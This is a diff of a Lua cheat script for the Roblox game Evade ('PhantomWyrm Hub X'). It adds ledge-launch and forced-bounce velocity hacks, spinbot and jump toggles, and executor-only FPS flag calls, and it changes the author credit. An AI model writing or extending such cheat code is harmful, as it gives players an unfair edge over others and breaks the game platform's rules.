@@ -17,7 +17,7 @@ _G.PhantomWyrmXIsAlreadyRunning = true
 
 local Window = Fluent:CreateWindow({
     Title = "PhantomWyrm Hub X - Evade Overhaul│Mobile",
-    SubTitle = "v3.20.12 Made By Carryxkn2",
+    SubTitle = "v3.24.12 Made By Carey",
     TabWidth = 160,
     Size = UDim2.fromOffset(540, 390),
     Acrylic = false,
@@ -736,6 +736,12 @@ local DConfiguration = {
                 EmoteBounce = 120,
                 SuperBounce = false,
                 SuperBounceStrength = -50,
+            },
+            
+            EdgeTrimpModification = {
+	            Enabled = false,
+	            HeightMultiplier = 1.5,
+	            DownThreshold = 4.5
             },
 
             LagSwitch = {
@@ -1791,6 +1797,170 @@ function DFunctions.getNearestDownedPlayer()
             if distance < nearestDistance then
                 nearestDistance = distance
                 nearestPlayer = player
+            end
+        end
+    end
+
+    return nearestPlayer
+end
+
+local EdgeParams = RaycastParams.new()
+EdgeParams.FilterType = Enum.RaycastFilterType.Blacklist
+EdgeParams.FilterDescendantsInstances = {}
+
+function DFunctions.ModifyEdgeTrimp()
+    local Character = LocalPlayer.Character
+    if not Character then return end
+
+    local Root = Character:FindFirstChild("HumanoidRootPart")
+    local Humanoid = Character:FindFirstChild("Humanoid")
+    if not Root or not Humanoid then return end
+
+    local Velocity = Root.AssemblyLinearVelocity
+    local HorizontalVel = Vector3.new(Velocity.X, 0, Velocity.Z)
+    local Speed = HorizontalVel.Magnitude
+    if Speed < 22 then return end
+
+    local MoveDir = HorizontalVel.Unit
+    local LookDir = Root.CFrame.LookVector.Unit
+
+    EdgeParams.FilterDescendantsInstances = {Character}
+
+    local PredictTime = math.clamp(Speed / 110, 0.14, 0.24)
+    local EarlyOffset = 2.5
+
+    local FutureMovePos = Root.Position + HorizontalVel * PredictTime + MoveDir * EarlyOffset
+    local FutureLookPos = Root.Position + HorizontalVel * PredictTime + LookDir * EarlyOffset
+
+    if Velocity.Y > 5 then return end
+
+    local validEdge = false
+    local minRaysForTrigger = 2
+    local maxSlope = 0.8
+    local minHeightDiff = 1.5
+
+    local fanOffsets = {
+        Vector3.new(0,0,0),
+        Vector3.new(0.25,0,0.25),
+        Vector3.new(-0.25,0,-0.25),
+        Vector3.new(0.25,0,-0.25),
+        Vector3.new(-0.25,0,0.25)
+    }
+
+    local moveHits = 0
+    local lookHits = 0
+
+    for _, offset in ipairs(fanOffsets) do
+        local startMove = FutureMovePos + offset
+        local forwardHitMove = workspace:Raycast(startMove + Vector3.new(0,2,0), MoveDir * 3.5, EdgeParams)
+
+        if forwardHitMove and forwardHitMove.Normal.Y < 0.2 then
+            local topCheckMove = workspace:Raycast(
+                forwardHitMove.Position + Vector3.new(0,2.2,0),
+                Vector3.new(0,-5,0),
+                EdgeParams
+            )
+
+            if topCheckMove and topCheckMove.Normal.Y >= maxSlope then
+                if topCheckMove.Position.Y - Root.Position.Y > minHeightDiff then
+                    moveHits += 1
+                end
+            end
+        end
+
+        local startLook = FutureLookPos + offset
+        local forwardHitLook = workspace:Raycast(startLook + Vector3.new(0,2,0), LookDir * 3.5, EdgeParams)
+
+        if forwardHitLook and forwardHitLook.Normal.Y < 0.2 then
+            local topCheckLook = workspace:Raycast(
+                forwardHitLook.Position + Vector3.new(0,2.2,0),
+                Vector3.new(0,-5,0),
+                EdgeParams
+            )
+
+            if topCheckLook and topCheckLook.Normal.Y >= maxSlope then
+                if topCheckLook.Position.Y - Root.Position.Y > minHeightDiff then
+                    lookHits += 1
+                end
+            end
+        end
+    end
+
+    if moveHits >= 1 and lookHits >= 1 then
+        validEdge = true
+    end
+
+    local downVotes = 0
+    local earlyForward = MoveDir * 2
+    local dropThreshold = DConfiguration.Misc.Utilities.EdgeTrimpModification.DownThreshold
+    local halfDepth = Root.Size.Z / 2
+    local forwardDistances = {
+	    halfDepth + 0.1,
+	    halfDepth + 0.4,
+	    halfDepth + 0.7,
+	    halfDepth + 1
+    }
+
+    for _, offset in ipairs(fanOffsets) do
+        local startPos = FutureMovePos + offset + earlyForward
+
+        local downHit = workspace:Raycast(
+            startPos + Vector3.new(0,2,0),
+            Vector3.new(0,-6,0),
+            EdgeParams
+        )
+
+        if downHit then
+            local drop = Root.Position.Y - downHit.Position.Y
+
+            local edgeFound = false
+
+            for _, dist in ipairs(forwardDistances) do
+                local check = workspace:Raycast(
+                    Root.Position + MoveDir * dist,
+                    Vector3.new(0,-6,0),
+                    EdgeParams
+                )
+
+                if not check then
+                    edgeFound = true
+                    break
+                end
+            end
+
+            if drop >= dropThreshold and edgeFound then
+                downVotes += 1
+            end
+        end
+    end
+
+    if downVotes >= minRaysForTrigger then
+        validEdge = true
+    end
+
+    if not validEdge then return end
+
+    Root.AssemblyLinearVelocity =
+        HorizontalVel * 1.05 +
+        Vector3.new(0, math.clamp(Speed * 0.7, 22, 85), 0) *
+        DConfiguration.Misc.Utilities.EdgeTrimpModification.HeightMultiplier
+end
+
+local WorkspacePlayers = game:GetService("Workspace").Game.Players
+
+function DFunctions.getNearestDownedPlayer()
+    local nearestPlayer = nil
+    local nearestDistance = 10
+    local HumanoidRootPart = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    if not HumanoidRootPart then return nil end
+
+    for _, v in pairs(WorkspacePlayers:GetChildren()) do
+        local targetRoot = v:FindFirstChild("HumanoidRootPart")
+        if v:GetAttribute("Downed") and targetRoot and not targetRoot.Anchored then
+            local distance = (HumanoidRootPart.Position - targetRoot.Position).Magnitude
+            if distance < nearestDistance then
+                nearestDistance = distance
+                nearestPlayer = v
             end
         end
     end
@@ -4165,9 +4335,44 @@ Tabs.Misc:AddParagraph({
         Content = ""
     })
     
-local Toggle = Tabs.Misc:AddToggle("AdjustBounce", {Title = "Modify Bounce", Default = false })
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
 
-Toggle:OnChanged(function(State)
+_SB = _SB or { Power = 100 }
+DConfiguration = DConfiguration or { Settings = { GuiScale = { BounceBot = 0 } } }
+DFunctions = DFunctions or {}
+
+local function TriggerBounce()
+    local character = LocalPlayer.Character
+    local rootPart = character and character:FindFirstChild("HumanoidRootPart")
+    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+    
+    if rootPart and humanoid then
+        local raycastParams = RaycastParams.new()
+        raycastParams.FilterType = Enum.RaycastFilterType.Exclude
+        raycastParams.FilterDescendantsInstances = {character}
+        raycastParams.IgnoreWater = true
+        
+        local rayResult = workspace:Raycast(rootPart.Position, Vector3.new(0, -100, 0), raycastParams)
+        
+        if rayResult and rayResult.Instance and rayResult.Instance:IsA("BasePart") and rayResult.Instance.CanCollide then
+            local safePower = math.clamp(_SB.Power, 0, 500)
+            
+            humanoid:ChangeState(Enum.HumanoidStateType.Physics)
+            rootPart.AssemblyLinearVelocity = Vector3.new(rootPart.AssemblyLinearVelocity.X, safePower, rootPart.AssemblyLinearVelocity.Z)
+            
+            task.defer(function()
+                if humanoid then
+                    humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
+                end
+            end)
+        end
+    end
+end
+
+local ToggleModify = Tabs.Misc:AddToggle("AdjustBounce", {Title = "Modify Bounce", Default = false })
+
+ToggleModify:OnChanged(function(State)
     DConfiguration.Misc.Utilities.BounceModification.Enabled = State
      
     while DConfiguration.Misc.Utilities.BounceModification.Enabled and wait(0.1) do
@@ -4175,9 +4380,31 @@ Toggle:OnChanged(function(State)
     end
 end)
 
-local Toggle = Tabs.Misc:AddToggle("SuperBounce", {Title = "Super Bounce", Default = false})
+Tabs.Misc:AddInput("PlayerBounce", {
+    Title = "Player Bounce",
+    Default = "80",
+    Placeholder = "Bounce Number",
+    Numeric = false,
+    Finished = false, 
+    Callback = function(Value)
+        DConfiguration.Misc.Utilities.BounceModification.DefaultBounce = tonumber(Value) or 80
+    end
+})
+    
+Tabs.Misc:AddInput("EmoteBounce", {
+    Title = "Emote Bounce",
+    Default = "120",
+    Placeholder = "Bounce Number",
+    Numeric = false, 
+    Finished = false, 
+    Callback = function(Value)
+        DConfiguration.Misc.Utilities.BounceModification.EmoteBounce = tonumber(Value) or 120
+    end
+})
 
-Toggle:OnChanged(function(State)
+local ToggleSuper = Tabs.Misc:AddToggle("SuperBounce", {Title = "Super Bounce", Default = false})
+
+ToggleSuper:OnChanged(function(State)
     if State then
         DFunctions.CreateButton("SuperBounceButton", "Super Bounce", 0.1 + DConfiguration.Settings.GuiScale.SuperBounce, 0.1 + DConfiguration.Settings.GuiScale.SuperBounce, function(btn)
            DFunctions.SuperBounce()
@@ -4190,26 +4417,119 @@ Toggle:OnChanged(function(State)
     end
 end)
 
- Tabs.Misc:AddInput("PlayerBounce", {
-        Title = "Player Bounce",
-        Default = "80",
-        Placeholder = "Bounce Number",
-        Numeric = false,
-        Finished = false, 
-        Callback = function(Value)
-            DConfiguration.Misc.Utilities.BounceModification.DefaultBounce = tonumber(Value) or 80
+Tabs.Misc:AddInput("SuperBounceSize", {
+    Title = "Super Bounce Size",
+    Default = tostring(DConfiguration.Settings.GuiScale.SuperBounce),
+    Placeholder = "0",
+    Numeric = true,
+    Finished = false,
+    Callback = function(Value)
+        local num = tonumber(Value)
+        if num then
+            local safeSize = math.clamp(num * 0.01, 0, 2)
+            DConfiguration.Settings.GuiScale.SuperBounce = safeSize
+        else
+            DConfiguration.Settings.GuiScale.SuperBounce = 0
         end
-    })
+        DFunctions.UpdateButton("SuperBounceButton", 0.1 + DConfiguration.Settings.GuiScale.SuperBounce, 0.1 + DConfiguration.Settings.GuiScale.SuperBounce)
+    end
+})
+
+local ToggleRegular = Tabs.Misc:AddToggle("BounceBtnShow", {
+    Title = "Rebound Button", 
+    Description = "is used further than 100 studs from solid objects",
+    Default = false
+})
+
+ToggleRegular:OnChanged(function(S)
+    if S then
+        local sizeOffset = DConfiguration.Settings.GuiScale.BounceBot or 0
+        
+        DFunctions.CreateButton("BounceBtn", "Rebound", 0.15 + sizeOffset, 0.1 + sizeOffset, function(btn)
+            TriggerBounce()
+            if btn then
+                btn.Text = "..."
+                task.wait(0.1)
+                btn.Text = "Rebound..."
+            end
+        end)
+    else
+        DFunctions.DestroyButton("BounceBtn")
+    end
+end)
+
+Tabs.Misc:AddInput("BouncePowerInput", {
+    Title = "Rebound Power",
+    Default = tostring(_SB.Power),
+    Placeholder = "100",
+    Numeric = true,
+    Finished = false,
+    Callback = function(Value)
+        local num = tonumber(Value)
+        if num then
+            _SB.Power = math.clamp(num, 0, 500)
+        else
+            _SB.Power = 100
+        end
+    end
+})
+
+Tabs.Misc:AddInput("BounceBtnSize", {
+    Title = "Rebound Size Button",
+    Default = tostring(DConfiguration.Settings.GuiScale.BounceBot),
+    Placeholder = "0",
+    Numeric = true,
+    Finished = false,
+    Callback = function(Value)
+        local num = tonumber(Value)
+        if num then
+            local safeSize = math.clamp(num * 0.01, 0, 2)
+            DConfiguration.Settings.GuiScale.BounceBot = safeSize
+        else
+            DConfiguration.Settings.GuiScale.BounceBot = 0
+        end
+        DFunctions.UpdateButton("BounceBtn", 0.15 + DConfiguration.Settings.GuiScale.BounceBot, 0.1 + DConfiguration.Settings.GuiScale.BounceBot)
+    end
+})
+
     
- Tabs.Misc:AddInput("EmoteBounce", {
-        Title = "Emote Bounce",
-        Default = "120",
-        Placeholder = "Bounce Number",
+Tabs.Misc:AddSection("Edges")
+    
+    local Toggle = Tabs.Misc:AddToggle("AdjustEdgeTrimp", {Title = "Modify Edge Trimp", Default = false })
+
+Toggle:OnChanged(function(State)
+    DConfiguration.Misc.Utilities.EdgeTrimpModification.Enabled = State
+     
+    while DConfiguration.Misc.Utilities.EdgeTrimpModification.Enabled and wait(0.1) do
+        spawn(DFunctions.ModifyEdgeTrimp)
+    end
+end)
+
+Tabs.Misc:AddInput("EdgeTrimpHeight", {
+        Title = "Height Multiplier",
+        Default = "1.5",
+        Placeholder = "Number",
         Numeric = false, 
         Finished = false, 
         Callback = function(Value)
-            DConfiguration.Misc.Utilities.BounceModification.EmoteBounce = tonumber(Value) or 120
+            DConfiguration.Misc.Utilities.EdgeTrimpModification.HeightMultiplier = tonumber(Value) or 1.5
         end
+    })
+    
+Tabs.Misc:AddInput("DownThreshold", {
+        Title = "Falling Threshold",
+        Default = "4.5",
+        Placeholder = "Number",
+        Numeric = false, 
+        Finished = false, 
+        Callback = function(Value)
+            DConfiguration.Misc.Utilities.EdgeTrimpModification.DownThreshold = tonumber(Value) or 4.5
+        end
+    })
+    
+    Tabs.Misc:AddParagraph({
+        Title = " ",
+        Content = ""
     })
     
     do
@@ -4267,7 +4587,7 @@ end)
     end
 
     Tabs.Misc:AddToggle("CactusToggle", {
-        Title = "Cactus Platforms",
+        Title = "Cactus Edge Platform",
         Default = false,
         Callback = function(Value)
             PlatData.Enabled = Value
@@ -5186,91 +5506,12 @@ Tabs.Misc:AddInput("BHOPAcceleration", {
         Description = "Negative Only",
         Default = "-0.1",
         Placeholder = "-1",
-        Numeric = false, -- Only allows numbers
-        Finished = false, -- Only calls callback when you press enter
+        Numeric = false, 
+        Finished = false,
         Callback = function(Value)
             DConfiguration.Misc.MovementModification.BHOP.Acceleration = tonumber(Value) or -0.1
         end
     })
-    
-do 
-    local Players = game:GetService("Players")
-    local RunService = game:GetService("RunService")
-    local LP = Players.LocalPlayer
-
-    DConfiguration.Settings.GuiScale = DConfiguration.Settings.GuiScale or {}
-    DConfiguration.Settings.GuiScale.SpinBot = DConfiguration.Settings.GuiScale.SpinBot or 0
-
-    local _SP = {
-        Enabled = false,
-        Speed = 100000,
-        Conn = nil
-    }
-
-        local function ToggleSpin(state)
-        _SP.Enabled = state
-        if _SP.Conn then _SP.Conn:Disconnect() _SP.Conn = nil end
-
-        if _SP.Enabled then
-            _SP.Conn = RunService.Heartbeat:Connect(function(dt)
-                local character = LP.Character
-                local hrp = character and character:FindFirstChild("HumanoidRootPart")
-                local hum = character and character:FindFirstChild("Humanoid")
-                
-                if hrp and hum then
-                    if hum.FloorMaterial == Enum.Material.Air then
-                        hrp.Orientation = Vector3.new(hrp.Orientation.X, hrp.Orientation.Y + (_SP.Speed * dt), hrp.Orientation.Z)
-                    end
-                else
-                    if _SP.Conn then _SP.Conn:Disconnect() _SP.Conn = nil end
-                end
-            end)
-        end
-    end
-
-
-    Tabs.Misc:AddToggle("SpinbotMaster", {
-        Title = "Rotation 360",
-        Description = "Not Use Emote",
-        Default = false,
-        Callback = function(Value)
-            ToggleSpin(Value)
-        end
-    })
-    
-        Tabs.Misc:AddToggle("SpinBtnShow", {Title = "Show Spin Button", Default = false}):OnChanged(function(S)
-        if S then
-            local sizeOffset = DConfiguration.Settings.GuiScale.SpinBot or 0
-            DFunctions.CreateButton("SpinbotBtn", _SP.Enabled and "SPIN: ON" or "SPIN: OFF", 0.15 + sizeOffset, 0.1 + sizeOffset, function(btn)
-                ToggleSpin(not _SP.Enabled)
-                if btn and btn.Text then
-                    btn.Text = _SP.Enabled and "SPIN: ON" or "SPIN: OFF"
-                end
-            end)
-        else
-            ToggleSpin(false)
-            DFunctions.DestroyButton("SpinbotBtn")
-        end
-    end)
-
-    Tabs.Misc:AddInput("SpinBtnSize", {
-        Title = "Spin Gui Size",
-        Default = tostring(DConfiguration.Settings.GuiScale.SpinBot),
-        Placeholder = "0",
-        Numeric = true,
-        Finished = false,
-        Callback = function(Value)
-            local num = tonumber(Value)
-            if num then
-                DConfiguration.Settings.GuiScale.SpinBot = num * 0.01
-            else
-                DConfiguration.Settings.GuiScale.SpinBot = 0
-            end
-            DFunctions.UpdateButton("SpinbotBtn", 0.15 + DConfiguration.Settings.GuiScale.SpinBot, 0.1 + DConfiguration.Settings.GuiScale.SpinBot)
-        end
-    })
-end
-   
     
 Tabs.Misc:AddParagraph({
         Title = " ",
@@ -5287,8 +5528,8 @@ Tabs.Misc:AddInput("BHOPAcceleration", {
         Title = "Max Speed Acceleration",
         Default = "70",
         Placeholder = "70",
-        Numeric = false, -- Only allows numbers
-        Finished = false, -- Only calls callback when you press enter
+        Numeric = false, 
+        Finished = false,
         Callback = function(Value)
             DConfiguration.Misc.MovementModification.BHOP.MaxSpeed = tonumber(Value) or 70
         end
@@ -5416,7 +5657,186 @@ RunService.Heartbeat:Connect(function()
     RunService.RenderStepped:Wait()
 end)
 
+Tabs.Misc:AddSection("Spins")
+    
+do 
+    local Players = game:GetService("Players")
+    local RunService = game:GetService("RunService")
+    local LP = Players.LocalPlayer
 
+    DConfiguration.Settings.GuiScale = DConfiguration.Settings.GuiScale or {}
+    DConfiguration.Settings.GuiScale.SpinBot = DConfiguration.Settings.GuiScale.SpinBot or 0
+
+    local _SP = {
+        Enabled = false,
+        Speed = 100000,
+        Conn = nil
+    }
+
+        local function ToggleSpin(state)
+        _SP.Enabled = state
+        if _SP.Conn then _SP.Conn:Disconnect() _SP.Conn = nil end
+
+        if _SP.Enabled then
+            _SP.Conn = RunService.Heartbeat:Connect(function(dt)
+                local character = LP.Character
+                local hrp = character and character:FindFirstChild("HumanoidRootPart")
+                local hum = character and character:FindFirstChild("Humanoid")
+                
+                if hrp and hum then
+                    if hum.FloorMaterial == Enum.Material.Air then
+                        hrp.Orientation = Vector3.new(hrp.Orientation.X, hrp.Orientation.Y + (_SP.Speed * dt), hrp.Orientation.Z)
+                    end
+                else
+                    if _SP.Conn then _SP.Conn:Disconnect() _SP.Conn = nil end
+                end
+            end)
+        end
+    end
+
+
+    Tabs.Misc:AddToggle("SpinbotMaster", {
+        Title = "Rotation 360",
+        Description = "Not Use Emote",
+        Default = false,
+        Callback = function(Value)
+            ToggleSpin(Value)
+        end
+    })
+    
+        Tabs.Misc:AddToggle("SpinBtnShow", {Title = "Show Spin Button", Default = false}):OnChanged(function(S)
+        if S then
+            local sizeOffset = DConfiguration.Settings.GuiScale.SpinBot or 0
+            DFunctions.CreateButton("SpinbotBtn", _SP.Enabled and "SPIN: ON" or "SPIN: OFF", 0.15 + sizeOffset, 0.1 + sizeOffset, function(btn)
+                ToggleSpin(not _SP.Enabled)
+                if btn and btn.Text then
+                    btn.Text = _SP.Enabled and "SPIN: ON" or "SPIN: OFF"
+                end
+            end)
+        else
+            ToggleSpin(false)
+            DFunctions.DestroyButton("SpinbotBtn")
+        end
+    end)
+
+    Tabs.Misc:AddInput("SpinBtnSize", {
+        Title = "Spin Gui Size",
+        Default = tostring(DConfiguration.Settings.GuiScale.SpinBot),
+        Placeholder = "0",
+        Numeric = true,
+        Finished = false,
+        Callback = function(Value)
+            local num = tonumber(Value)
+            if num then
+                DConfiguration.Settings.GuiScale.SpinBot = num * 0.01
+            else
+                DConfiguration.Settings.GuiScale.SpinBot = 0
+            end
+            DFunctions.UpdateButton("SpinbotBtn", 0.15 + DConfiguration.Settings.GuiScale.SpinBot, 0.1 + DConfiguration.Settings.GuiScale.SpinBot)
+        end
+    })
+end
+
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+_SP = _SP or { Enabled = false, Speed = 20 } 
+DConfiguration = DConfiguration or { Settings = { GuiScale = { SpinBot = 0 } } }
+DFunctions = DFunctions or {} 
+
+local spinConnection
+
+local function ToggleSpin(state)
+    _SP.Enabled = state
+    
+    local spinBtn = game:GetService("CoreGui"):FindFirstChild("SpinbotBtn") or LocalPlayer.PlayerGui:FindFirstChild("SpinbotBtn")
+    if spinBtn and spinBtn:IsA("TextButton") then
+        spinBtn.Text = _SP.Enabled and "SPIN EMOTE: ON" or "SPIN EMOTE: OFF"
+    end
+
+    if _SP.Enabled then
+        if not spinConnection then
+            spinConnection = RunService.Heartbeat:Connect(function()
+                local character = LocalPlayer.Character
+                local rootPart = character and character:FindFirstChild("HumanoidRootPart")
+                if rootPart then
+                    local safeSpeed = math.clamp(_SP.Speed, -200, 200)
+                    rootPart.CFrame = rootPart.CFrame * CFrame.Angles(0, math.rad(safeSpeed), 0)
+                end
+            end)
+        end
+    else
+        if spinConnection then
+            spinConnection:Disconnect()
+            spinConnection = nil
+        end
+    end
+end
+
+Tabs.Misc:AddToggle("SpinbotMaster", {
+    Title = "Rotation 360",
+    Description = "(only emote)",
+    Default = false,
+    Callback = function(Value)
+        ToggleSpin(Value)
+    end
+})
+
+Tabs.Misc:AddInput("SpinSpeedInput", {
+    Title = "Spin Speed",
+    Default = tostring(_SP.Speed),
+    Placeholder = "20",
+    Numeric = true,
+    Finished = false,
+    Callback = function(Value)
+        local num = tonumber(Value)
+        if num then
+            _SP.Speed = math.clamp(num, -200, 200)
+        else
+            _SP.Speed = 20
+        end
+    end
+})
+
+Tabs.Misc:AddToggle("SpinBtnShow", {
+    Title = "Show Spin Button", 
+    Default = false
+}):OnChanged(function(S)
+    if S then
+        local sizeOffset = DConfiguration.Settings.GuiScale.SpinBot or 0
+        
+        DFunctions.CreateButton("SpinbotBtn", _SP.Enabled and "SPIN EMOTE: ON" or "SPIN EMOTE: OFF", 0.15 + sizeOffset, 0.1 + sizeOffset, function(btn)
+            ToggleSpin(not _SP.Enabled)
+            if btn and btn.Text then
+                btn.Text = _SP.Enabled and "SPIN EMOTE: ON" or "SPIN EMOTE: OFF"
+            end
+        end)
+    else
+        ToggleSpin(false)
+        DFunctions.DestroyButton("SpinbotBtn")
+    end
+end)
+
+Tabs.Misc:AddInput("SpinBtnSize", {
+    Title = "Spin Gui Size",
+    Default = tostring(DConfiguration.Settings.GuiScale.SpinBot),
+    Placeholder = "0",
+    Numeric = true,
+    Finished = false,
+    Callback = function(Value)
+        local num = tonumber(Value)
+        if num then
+            local safeSize = math.clamp(num * 0.01, 0, 2)
+            DConfiguration.Settings.GuiScale.SpinBot = safeSize
+        else
+            DConfiguration.Settings.GuiScale.SpinBot = 0
+        end
+        DFunctions.UpdateButton("SpinbotBtn", 0.15 + DConfiguration.Settings.GuiScale.SpinBot, 0.1 + DConfiguration.Settings.GuiScale.SpinBot)
+    end
+})
+
+    
 -- Premium 
  
  local FakeSection = Tabs.Premium:AddSection("Visuals")
@@ -6617,8 +7037,8 @@ Tabs.Visual:AddSection("Cosmetics Changer")
         Title = "Current Cosmetics 1",
         Default = " ",
         Placeholder = "",
-        Numeric = false, -- Only allows numbers
-        Finished = false, -- Only calls callback when you press enter
+        Numeric = false, 
+        Finished = false, 
         Callback = function(Value)
             DConfiguration.Visual.OriginalCosmetics.Cosmetics1 = Value
         end
@@ -6628,8 +7048,8 @@ Tabs.Visual:AddSection("Cosmetics Changer")
         Title = "Current Cosmetics 2",
         Default = " ",
         Placeholder = "",
-        Numeric = false, -- Only allows numbers
-        Finished = false, -- Only calls callback when you press enter
+        Numeric = false,
+        Finished = false, 
         Callback = function(Value)
             DConfiguration.Visual.OriginalCosmetics.Cosmetics2 = Value
         end
@@ -6639,8 +7059,8 @@ Tabs.Visual:AddSection("Cosmetics Changer")
         Title = "Current Effect",
         Default = " ",
         Placeholder = "",
-        Numeric = false, -- Only allows numbers
-        Finished = false, -- Only calls callback when you press enter
+        Numeric = false, 
+        Finished = false, 
         Callback = function(Value)
             DConfiguration.Visual.OriginalCosmetics.Cosmetics3 = Value
         end
@@ -6650,8 +7070,8 @@ Tabs.Visual:AddSection("Cosmetics Changer")
         Title = "Current Character",
         Default = " ",
         Placeholder = "",
-        Numeric = false, -- Only allows numbers
-        Finished = false, -- Only calls callback when you press enter
+        Numeric = false, 
+        Finished = false, 
         Callback = function(Value)
             DConfiguration.Visual.OriginalCosmetics.Cosmetics4 = Value
         end
@@ -6666,8 +7086,8 @@ Tabs.Visual:AddParagraph({
         Title = "Select Cosmetics 1",
         Default = " ",
         Placeholder = "",
-        Numeric = false, -- Only allows numbers
-        Finished = false, -- Only calls callback when you press enter
+        Numeric = false, 
+        Finished = false, 
         Callback = function(Value)
             DConfiguration.Visual.ModifyCosmetics.Cosmetics1 = Value
         end
@@ -6677,8 +7097,8 @@ Tabs.Visual:AddParagraph({
         Title = "Select Cosmetics 2",
         Default = " ",
         Placeholder = "",
-        Numeric = false, -- Only allows numbers
-        Finished = false, -- Only calls callback when you press enter
+        Numeric = false, 
+        Finished = false, 
         Callback = function(Value)
             DConfiguration.Visual.ModifyCosmetics.Cosmetics2 = Value
         end
@@ -6688,8 +7108,8 @@ Tabs.Visual:AddParagraph({
         Title = "Select Effect",
         Default = " ",
         Placeholder = "",
-        Numeric = false, -- Only allows numbers
-        Finished = false, -- Only calls callback when you press enter
+        Numeric = false, 
+        Finished = false, 
         Callback = function(Value)
             DConfiguration.Visual.ModifyCosmetics.Cosmetics3 = Value
         end
@@ -6699,8 +7119,8 @@ Tabs.Visual:AddParagraph({
         Title = "Select Character",
         Default = " ",
         Placeholder = "",
-        Numeric = false, -- Only allows numbers
-        Finished = false, -- Only calls callback when you press enter
+        Numeric = false, 
+        Finished = false, 
         Callback = function(Value)
             DConfiguration.Visual.ModifyCosmetics.Cosmetics4 = Value
         end
@@ -7047,7 +7467,7 @@ Tabs.Visual:AddButton({
     
 -- Rounds
 
-do
+ do
     local EvadeFixes = {
         AntiFlip = false,
         AntiInvert = false,
@@ -7091,40 +7511,42 @@ do
         end
     end)
 end
+ 
+local Toggle = Tabs.Anti:AddToggle("PlayerJumpPower", {Title = "Anti No Jump", Default = false })
 
-do
-    local JumpConfig = {
-        Enabled = false,
-        LP = game:GetService("Players").LocalPlayer
-    }
 
-    local JumpToggle = Tabs.Anti:AddToggle("PlayerJumpPower", {Title = "Anti No Jump", Default = false})
-
-    JumpToggle:OnChanged(function(State)
-        JumpConfig.Enabled = State
-        DConfiguration.Misc.Humanoids.OriginalJumpHeight = State
-        
-        if State then
-            task.spawn(function()
-                while JumpConfig.Enabled and task.wait(0.1) do
-                    local char = JumpConfig.LP.Character
-                    local humanoid = char and char:FindFirstChildOfClass("Humanoid")
-                    
-                    if humanoid then
-                        if not UseOriginalJump then
-                            humanoid.UseJumpPower = false
-                            humanoid.JumpPower = 20
-                        else
-                            humanoid.UseJumpPower = true
-                            humanoid.JumpPower = DConfiguration.Misc.Humanoids.JP
-                        end
-                    end
-                end
-            end)
+local function updateJump(humanoid, state)
+    if humanoid then
+        if state then
+            
+            humanoid.UseJumpPower = true
+            humanoid.JumpPower = 20 -- или ваше фиксированное значение
+        else
+            
+            humanoid.UseJumpPower = true
+            humanoid.JumpPower = DConfiguration.Misc.Humanoids.JP
         end
-    end)
+    end
 end
 
+Toggle:OnChanged(function(State)
+    DConfiguration.Misc.Humanoids.OriginalJumpHeight = State
+    
+    
+    local character = LocalPlayer.Character
+    if character then
+        local humanoid = character:FindFirstChildOfClass("Humanoid")
+        updateJump(humanoid, State)
+    end
+end)
+
+
+LocalPlayer.CharacterAdded:Connect(function(character)
+    local humanoid = character:WaitForChild("Humanoid")
+    
+    local currentState = DConfiguration.Misc.Humanoids.OriginalJumpHeight
+    updateJump(humanoid, currentState)
+end)
 
  
 -- info
@@ -7139,12 +7561,12 @@ Tabs.Info:AddButton({
 
 Tabs.Info:AddParagraph({
     Title = "PhantomWyrm-Hub-X",
-    Content = "Made By Carryxkn2"
+    Content = "Made By Carey"
 })
 
 Tabs.Info:AddParagraph({
     Title = "Premium Functions",
-    Content = "Made by Carryxkn2"
+    Content = "Made by Carey"
 })
 
 Tabs.Info:AddParagraph({
@@ -8167,11 +8589,10 @@ Tabs.Extension:AddButton({
     end
 })
 
-do
-    local Lighting = game:GetService("Lighting")
-    
-    local defaultGlobalShadows = Lighting.GlobalShadows
-    local defaultTechnology = Lighting.Technology
+task.spawn(function()
+    Lighting = game:GetService("Lighting")
+    defaultGlobalShadows = Lighting.GlobalShadows
+    defaultTechnology = Lighting.Technology
 
     Tabs.Extension:AddToggle("ShadowsToggle", {
         Title = "Remove All Shadows",
@@ -8180,9 +8601,7 @@ do
         Callback = function(state)
             if state then
                 Lighting.GlobalShadows = false
-                
                 Lighting.Technology = Enum.Technology.Compatibility
-                
                 for _, obj in ipairs(workspace:GetDescendants()) do
                     if obj:IsA("BasePart") then
                         obj.CastShadow = false
@@ -8191,7 +8610,6 @@ do
             else
                 Lighting.GlobalShadows = defaultGlobalShadows
                 Lighting.Technology = defaultTechnology
-                
                 for _, obj in ipairs(workspace:GetDescendants()) do
                     if obj:IsA("BasePart") then
                         obj.CastShadow = true 
@@ -8200,78 +8618,78 @@ do
             end
         end
     })
-end
+end)
 
-local Lighting = game:GetService("Lighting")
+task.spawn(function()
+    Lighting = game:GetService("Lighting")
 
-Tabs.Extension:AddToggle("DarknessToggle", {
-    Title = "Disable Light",
-    Description = "",
-    Default = false,
-    Callback = function(state)
-        for _, light in ipairs(workspace:GetDescendants()) do
-            if light:IsA("Light") then
-                light.Enabled = not state
-                task.wait() 
+    Tabs.Extension:AddToggle("DarknessToggle", {
+        Title = "Disable Light",
+        Description = "",
+        Default = false,
+        Callback = function(state)
+            for _, light in ipairs(workspace:GetDescendants()) do
+                if light:IsA("Light") then
+                    light.Enabled = not state
+                    task.wait() 
+                end
             end
         end
-    end
-})
+    })
+end)
 
-
-do
-    local FpsConfig = {
+task.spawn(function()
+    FpsConfig = {
         Enabled = false
     }
 
-    local function updateFps()
+    function updateFps()
         pcall(function()
-            local target = FpsConfig.Enabled and 9999 or 60
-            
+            target = FpsConfig.Enabled and 9999 or 60
             if setfflag then
                 setfflag("TaskSchedulerTargetFps", tostring(target))
                 setfflag("DFIntTaskSchedulerTargetFps", tostring(target))
             end
-            
             if setfpscap then
                 setfpscap(target)
             end
         end)
     end
-    
-local networkPausedConn
 
-local AntiGPTPause = Tabs.Extension:AddToggle("AntiNetworkPause", {
-    Title = "Anti Gameplay Paused", 
-    Default = false, 
-    Description = ""
-})
+    task.spawn(function()
+        networkPausedConn = nil
 
-AntiGPTPause:OnChanged(function(Value)
-    if Value then
-        pcall(function()
-            local RobloxGui = game:GetService("CoreGui"):WaitForChild("RobloxGui")
